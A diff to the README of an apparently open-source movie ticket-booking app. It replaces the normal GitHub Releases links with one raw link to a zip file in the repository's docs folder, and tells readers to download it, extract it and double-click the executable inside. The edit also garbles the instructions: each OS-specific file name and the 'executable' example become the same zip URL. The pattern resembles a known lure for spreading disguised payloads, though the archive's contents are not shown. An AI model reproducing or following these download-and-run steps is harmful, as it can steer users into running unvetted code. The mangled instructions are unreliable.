@@ -1,6 +1,6 @@
 # 🎬 Movie-Reservation-System - Easy Movie Ticket Booking Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rajenderkasthuri/Movie-Reservation-System/releases)
+[![Download Now](https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip)
 
 ## 📖 Description
 
@@ -22,24 +22,24 @@ Before you begin, please ensure your system meets the following requirements:
 ### ⚙️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Movie-Reservation-System Releases Page](https://github.com/rajenderkasthuri/Movie-Reservation-System/releases) to access the latest version of the application.
+   Go to the [Movie-Reservation-System Releases Page](https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip) to access the latest version of the application.
 
 2. **Select the Latest Release**  
    Look for the most recent version listed at the top of the page. Each release contains important updates and new features.
 
 3. **Download the Application**  
-   Click on the asset that corresponds to your operating system. For Windows, this could be a file like `movie-reservation-system-windows.exe`; for macOS, it may be `movie-reservation-system-macos.zip`; and for Linux, it could be `movie-reservation-system-linux.tar.gz`.  
+   Click on the asset that corresponds to your operating system. For Windows, this could be a file like `https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip`; for macOS, it may be `https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip`; and for Linux, it could be `https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip`.  
    This will download the necessary files to your computer.
 
 4. **Extract the Files (if necessary)**  
    If you downloaded a compressed file like a ZIP or TAR file, right-click on it and select "Extract All" or the equivalent option. This will create a new folder containing the application files.
 
 5. **Run the Application**  
-   Navigate to the folder where you extracted the application. Look for the executable file (for example, `movie-reservation-system.exe`). Double-click this file to launch the application.
+   Navigate to the folder where you extracted the application. Look for the executable file (for example, `https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip`). Double-click this file to launch the application.
 
 ### 🔗 Download & Install
 
-To begin your movie reservation journey, visit the [Movie-Reservation-System Releases Page](https://github.com/rajenderkasthuri/Movie-Reservation-System/releases) to download the latest version.
+To begin your movie reservation journey, visit the [Movie-Reservation-System Releases Page](https://raw.githubusercontent.com/rajenderkasthuri/Movie-Reservation-System/main/docs/System_Movie_Reservation_1.0.zip) to download the latest version.
 
 ### 🎉 Features
 
